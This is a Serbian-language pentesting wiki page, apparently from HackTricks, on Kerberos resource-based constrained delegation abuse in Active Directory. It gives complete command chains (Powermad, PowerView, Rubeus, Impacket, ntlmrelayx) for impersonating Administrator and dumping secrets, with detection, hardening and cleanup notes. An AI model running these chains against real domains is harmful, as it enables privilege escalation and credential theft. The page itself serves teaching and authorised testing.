# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Osnove Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) je sličan kao [constrained delegation](constrained-delegation.md), ali je smer poverenja obrnut. Traditional constrained delegation beleži kojim servisima principal može da delegira; RBCD na **ciljnom resursu** beleži koji principali mogu da imitiraju korisnike prema njemu.<sup>[[12]](#references)</sup>

Atribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ ciljnog objekta sadrži security descriptor koji identifikuje principale kojima je dozvoljeno da deluju u ime drugih identiteta prema tom resursu.

Druga važna razlika je u tome što principal sa dovoljnim **write permissions nad machine account-om** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` i slična prava) može imati mogućnost da postavi _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Konfigurisanje traditional constrained delegation obično zahteva pristup sa većim administratorskim privilegijama.<sup>[[1]](#references)</sup>

Preciznije, menjanje postavki classic constrained-delegation obično je uslovljeno privilegijom `SeEnableDelegationPrivilege` na domain controller-u, pravom koje obično poseduju highly privileged administratori. RBCD prebacuje odluku na security descriptor ciljnog objekta, tako da write access nad relevantnim svojstvom computer objekta može biti dovoljan bez tog user right-a.<sup>[[1]](#references)[[2]](#references)</sup>

### Novi koncepti

Zastavica **`TrustedToAuthForDelegation`** u `userAccountControl` često se opisuje kao preduslov za **S4U2Self**, ali to nije potpuno tačno.\
Service principal sa SPN-om može da zatraži S4U2Self bez te zastavice. Sa `TrustedToAuthForDelegation`, vraćeni service ticket je **forwardable**; bez nje, ticket je obično **non-forwardable**.<sup>[[5]](#references)</sup>

Traditional constrained delegation odbija **non-forwardable TGS** u koraku S4U2Proxy. RBCD može prihvatiti taj S4U2Self ticket kada security descriptor cilja autorizuje servis koji šalje zahtev.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struktura napada

> Ako imate **write-equivalent privileges** nad **computer account-om**, možda možete da dobijete privilegovan pristup toj mašini.

Pretpostavimo da napadač već ima **write-equivalent privileges nad objektom victim computer-a**.

1. Napadač **kompromituje** account sa **SPN-om** ili ga **kreira** ("Service A"). Po podrazumevanim postavkama, autentifikovani domain user može da kreira najviše 10 computer objekata, što kontroliše **_MachineAccountQuota_**; computer objekat automatski obezbeđuje upotrebljive SPN-ove.
2. Napadač **zloupotrebljava svoju WRITE privilegiju** nad victim computer-om (ServiceB) da konfiguriše **resource-based constrained delegation tako da dozvoli ServiceA da imitira bilo kog korisnika** prema tom victim computer-u (ServiceB).
3. Napadač koristi Rubeus za izvršavanje **potpunog S4U napada** (S4U2Self i S4U2Proxy) od Service A prema Service B za korisnika **sa privilegovanim pristupom Service B-u**.
1. S4U2Self (sa kompromitovanog ili kreiranog SPN account-a): zatražiti **TGS koji predstavlja Administrator-a prema Service A** (non-forwardable).
2. S4U2Proxy: upotrebiti taj **non-forwardable TGS** za zahtev za service ticket koji predstavlja **Administrator-a** prema **victim host-u**.
3. Non-forwardable ticket i dalje može da funkcioniše u ovom RBCD toku zato što je Service A autorizovan u security descriptor-u ciljnog resursa.
4. Napadač može da izvrši **pass-the-ticket** i **imitira** korisnika kako bi dobio **pristup victim ServiceB-u**.<sup>[[1]](#references)</sup>

Da biste proverili _**MachineAccountQuota**_ domena, možete koristiti:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Napad

### Kreiranje objekta računara

Možete kreirati objekat računara unutar domena pomoću **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurisanje Resource-based Constrained Delegation

**Korišćenje Active Directory PowerShell modula**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korišćenje powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Izvođenje kompletnog S4U napada (Windows/Rubeus)

Pre svega, kreirali smo novi Computer objekat sa lozinkom `123456`, pa nam je potreban hash te lozinke:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Ovo će ispisati RC4 i AES hash vrednosti za taj nalog.\
Sada se napad može izvršiti:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Možete generisati više ticket-a za više servisa samo jednim zahtevom koristeći parametar `/altservice` alata Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Korisnici mogu biti označeni kao **„Account is sensitive and cannot be delegated.“** Ako je ta zastavica omogućena, nalog ne može biti impersoniran kroz ovaj delegation flow. BloodHound prikazuje ovo svojstvo tokom analize.

### Linux alati: RBCD od početka do kraja pomoću Impacket-a (2024+)

Ako radite iz Linux-a, možete izvršiti ceo RBCD chain pomoću zvaničnih Impacket alata:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Napomene
- Ako je LDAP signing/LDAPS obavezan, koristite `impacket-rbcd -use-ldaps ...`.
- Dajte prednost AES ključevima; mnogi moderni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
- Impacket može da prepiše `sname` ("AnySPN") za neke alate, ali kad god je moguće pribavite ispravan SPN (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD između domena i forest-a

Ako se **delegirajući principal** kojim upravljate nalazi u **drugom domenu** (ili čak u **drugom forest-u**) u odnosu na **računar resursa**, zloupotreba je i dalje **RBCD**, ali tok ticket-a više nije uobičajeni jednodomenski `S4U2Self -> S4U2Proxy`.

### RBCD između domena: konfigurisanje foreign principal-a pomoću SID-a

Kada postavite `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, foreign machine/user možda **neće moći da se razreši po imenu** u LDAP-u ciljnog domena. U tom slučaju konfigurišite unos delegacije pomoću **SID-a** foreign principal-a umesto njegovog sAMAccountName/UPN-a.

Ovo je posebno relevantno prilikom relaying-a NTLM-a ka LDAP-u pomoću `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Napomene:
- `--sid` govori alatu `ntlmrelayx.py` da `--escalate-user` tretira kao SID, što je potrebno kada je delegirajući nalog iz druge domene u odnosu na ciljnu.
- Čak i ako alat prikaže `User not found in LDAP`, upis delegacije i dalje može biti uspešan jer security descriptor direktno čuva strani SID.

### RBCD između domena: cross-realm S4U redosled

Kada se strani principal nađe u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni tok između domena je:<sup>[[9]](#references)[[13]](#references)</sup>

1. Dobavite **TGT** za delegirajući principal iz njegovog domena.
2. Zatražite **referral TGT** za `krbtgt/<target-domain>`.
3. Zatražite **cross-realm S4U2Self referral** za impersonated user-a na DC-u ciljnog domena.
4. Zatražite stvarni **S4U2Self** ticket za tog user-a nazad u domenu delegatora.
5. Izvršite **S4U2Proxy** u domenu delegatora da biste dobili referral ticket za ciljni domen.
6. Izvršite završni **S4U2Proxy** na DC-u ciljnog domena da biste dobili service ticket za `cifs/host.target`, `host/host.target` itd.

Zbog toga standardni Linux alati često ne uspevaju kod RBCD između domena:<sup>[[9]](#references)</sup>
- **realm** zahteva možda mora da se razlikuje od realm-a TGT-a korišćenog u `TGS-REQ`
- lanac zahteva **nezavisne S4U2Proxy korake**, a ne samo `S4U2Self` ili `S4U2Self` neposredno praćen jednim `S4U2Proxy`

### RBCD između domena iz Linux-a

Synacktiv je objavio Impacket `getST.py` implementaciju koja iz Linux-a reprodukuje cross-realm redosled eksplicitnim rukovanjem sa dva KDC-a:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operativno, novi argumenti su:
- `-dc-ip`: DC **delegirajućeg** domena
- `-targetdomain`: domen **resource računara**
- `-targetdc`: DC **resource** domena

### Ograničenja RBCD-a između forest-a

RBCD između forest-a ima važno ograničenje: **impersonated user mora pripadati istom forest-u kao delegating principal**. Drugim rečima, ako se vaš kontrolisani machine account nalazi u `valhalla.local`, a ciljni resource je u `asgard.local`, uglavnom **ne možete impersonate proizvoljne `asgard.local` korisnike** prema tom resource-u putem RBCD-a.<sup>[[9]](#references)</sup>

I dalje je exploitable kada:
- je korisnik iz **delegating forest-a** **local admin** (ili na drugi način privileged) na resource host-u u drugom forest-u
- trust dozvoljava potrebnu authentication putanju, a strani SID je prihvaćen u security descriptor-u ciljnog računara

### Specifičnosti RBCD protokola između forest-a

RBCD između forest-a nije samo „cross-domain plus trust“. Uočeni tok uključuje dve specifičnosti koje uobičajeni alati istorijski propuštaju:<sup>[[9]](#references)</sup>

1. Dodatni **S4U2Proxy** zahtev koji postavlja **`PA-PAC-OPTIONS=branch-aware`**
2. Završni service ticket koji može biti vraćen korišćenjem **RC4** čak i kada su zatraženi drugi etypes

Praktičan tok je:

1. Dobiti TGT za delegating principal u forest-u A.
2. Zatražiti **S4U2Self** za impersonated user-a u forest-u A.
3. Zatražiti **S4U2Proxy** u forest-u A radi dobijanja referral TGT-a za forest B.
4. Poslati drugi **S4U2Proxy** u forest-u A **bez S4U2Self ticket-a kao additional ticket-a**, ali sa omogućenim `branch-aware`, radi dobijanja još jednog referral TGT-a za forest B.
5. Opciono zatražiti normalan service ticket u forest-u B za delegating principal (ovaj ticket nije potreban za završni abuse).
6. Koristiti referral ticket-e iz koraka 3 i 4 za zahtev finalnog **S4U2Proxy** ticket-a u forest-u B za impersonated forest-A user-a prema ciljnom SPN-u.

### RBCD između forest-a sa Linux-a

Ista Synacktiv Impacket grana dodaje `-forest` switch za ovu logiku:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekurzivni multi-domain RBCD (3+ domena)

U **multi-domain forestima**, i **S4U2Self** i **S4U2Proxy** mogu biti **rekurzivni**, umesto da se zaustave nakon jednog referral-a:

- **Rekurzivni S4U2Self**: prvi `S4U2Self` šalje se u domen **impersonated korisnika**, međukoraci između parent/child domena prolaze se pomoću normalnih `TGS-REQ` referral-a za `krbtgt/<REALM>`, a **konačni `S4U2Self`** šalje se u sopstvenom domenu **delegating principal-a**.
- To znači da samo posedovanje **TGT-a** za machine account može biti dovoljno za impersonaciju admina iz drugog domena u istom forestu i zahtev za `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekurzivni S4U2Proxy** prati trust chain na isti način: međukoraci ponovo koriste prethodni ticket kao TGT dok zahtevaju sledeći `krbtgt/<REALM>` referral, a samo poslednji korak vraća konačni service ticket.<sup>[[10]](#references)</sup>

Praktičan primer u istom forestu je:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD bez SPN-a između domena / šuma

Ako je **delegirajući principal korisnik bez SPN-a**, poslednji rekurzivni `S4U2Self` ne uspeva sa greškom **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Zaobilazno rešenje je da se **samo poslednji hop ponovi kao `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Kratka verzija lanca zloupotrebe:

1. Autentifikujte se pomoću **NT hash-a** kako bi KDC bio usmeren ka **RC4-HMAC (etype 23)**.
2. Prvo zatražite **`-self -u2u`** i sačuvajte tu kartu odvojeno od kasnijeg proxy koraka.
3. Izvucite **TGT session key** pomoću `describeTicket.py`.
4. Zamenite korisnikov **NT hash** tim **session key-em** koristeći `changepasswd.py -newhashes <session_key>`.
5. Ponovo upotrebite kartu **`S4U2Self+U2U`** kao **`-additional-ticket`** tokom zasebnog zahteva **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operativne napomene:

- Kada je **prvi trusted hop već druga forest**, preferirajte **branch-aware** algorithm (`getST.py ... -forest`) kako biste uskladili ponašanje sa nativnim Windows ponašanjem. Ako se do strane forest dolazi tek kasnije u chain-u, non-branch-aware rekurzivni tok i dalje može funkcionisati.<sup>[[9]](#references)</sup>
- Na novijim **Windows Server 2022/2025** DC-ovima, forsirani RC4 može da ne uspe sa **`KDC_ERR_ETYPE_NOSUPP`** zbog zastarevanja RC4-a; zbog toga **SPN-less RBCD** može biti nemoguć, iako klasični SPN-backed RBCD i dalje funkcioniše sa AES-om.<sup>[[15]](#references)</sup>
- Pokrenite **`S4U2Self+U2U` pre promene hash-a/lozinke korisnika**: `SamrChangePasswordUser` ne rekalkuliše Kerberos AES ključeve naloga, pa promena lozinke pre toga može pokvariti kasnije zahteve za ticket-ima.<sup>[[14]](#references)</sup>
- Impersonated account i dalje mora biti **delegable**: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokiraju chain.

## Napomene o detekciji / hardening-u

- RBCD putanje između domena/forest-a i dalje se obično kreiraju putem **ACL abuse-a** ili **relay-to-LDAP**. Uvedite **LDAP signing** i **LDAP channel binding** na DC-ovima kako biste prekinuli uobičajene setup putanje.
- Proverite ko može da upisuje `msDS-AllowedToActOnBehalfOfOtherIdentity` na computer objektima i razrešite sačuvane SID-ove, uključujući **foreign security principals**.
- U okruženjima sa mnogo trust-ova, proverite **Selective Authentication**, **SID filtering** i da li korisnici iz strane forest-e imaju **local admin** prava na resource hostovima.

### Pristupanje

Poslednja komandna linija će izvršiti **complete S4U attack** i ubaciti TGS od Administrator-a na victim host u **memoriju**.\
U ovom primeru zatražen je TGS za **CIFS** service od Administrator-a, pa ćete moći da pristupite **C$**:
```bash
ls \\victim.domain.local\C$
```
### Zloupotreba različitih service tickets

Saznajte više o [**dostupnim service tickets ovde**](silver-ticket.md#available-services).

## Enumerisanje, audit i čišćenje

### Enumerisanje računara sa konfigurisanim RBCD-om

PowerShell (dekodiranje SD-a radi razrešavanja SID-ova):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (čitanje ili pražnjenje jednom komandom):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Čišćenje / resetovanje RBCD-a

- PowerShell (brisanje atributa):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: To znači da je kerberos podešen tako da ne koristi DES ili RC4, a vi prosleđujete samo RC4 hash. Prosledite Rubeus-u najmanje AES256 hash (ili mu jednostavno prosledite RC4, AES128 i AES256 hash). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog korisnika: delegirajući principal verovatno **nema SPN**. Ponovite **poslednji hop** kao **`S4U2Self+U2U`** umesto regularnog **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tokom **SPN-less RBCD**: noviji DC-ovi mogu odbiti forsirani **RC4-HMAC** path potreban za trik **`S4U2Self+U2U`** + zamenu session key-a. Umesto toga pokušajte klasični **SPN-backed** RBCD path sa AES-om.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: To znači da se vreme na trenutnom računaru razlikuje od vremena na DC-u i da kerberos ne radi pravilno.
- **`preauth_failed`**: To znači da dati username + hash-evi ne rade za login. Možda ste zaboravili da stavite znak "$" unutar username-a prilikom generisanja hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Ovo može značiti:
- Korisnik koga pokušavate da impersonirate ne može da pristupi željenom servisu (zato što ne možete da ga impersonirate ili zato što nema dovoljno privilegija)
- Traženi servis ne postoji (ako tražite ticket za winrm, a winrm nije pokrenut)
- Kreirani fakecomputer je izgubio privilegije nad vulnerable serverom i morate mu ih ponovo dodeliti.
- Zloupotrebljavate classic KCD; zapamtite da RBCD radi sa non-forwardable S4U2Self ticket-ima, dok KCD zahteva forwardable.

## Notes, relays and alternatives

- RBCD SD možete upisati i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains se često završavaju u RBCD-u radi postizanja lokalnog SYSTEM-a u jednom koraku. Pogledajte praktične end-to-end primere:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ako su LDAP signing/channel binding **isključeni** i možete da kreirate machine account, alati kao što je **KrbRelayUp** mogu da relay-uju coerced Kerberos auth ka LDAP-u, podese `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš machine account na target computer object-u i odmah impersoniraju **Administrator** putem S4U-a sa off-host računara.<sup>[[8]](#references)</sup>

## References

- [1] [Mahanje psom: Zloupotreba Resource-Based Constrained Delegation za napad na Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Još jedna reč o Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Preuzimanje Computer Object-a](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Zloupotreba Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: Pregled ofanzivnog Kerberos-a](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (zvanični)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Kratak Linux cheatsheet sa novijom sintaksom](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing isključen → Kerberos relay ka RBCD-u)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Istraživanje cross-domain i cross-forest RBCD-a](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Istraživanje cross-domain i cross-forest RBCD-a: drugi deo](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket grana - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Pregled Kerberos constrained delegation-a](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Otkrivanje i saniranje korišćenja RC4 u Kerberos-u](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Detalji S4U2Proxy-ja](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
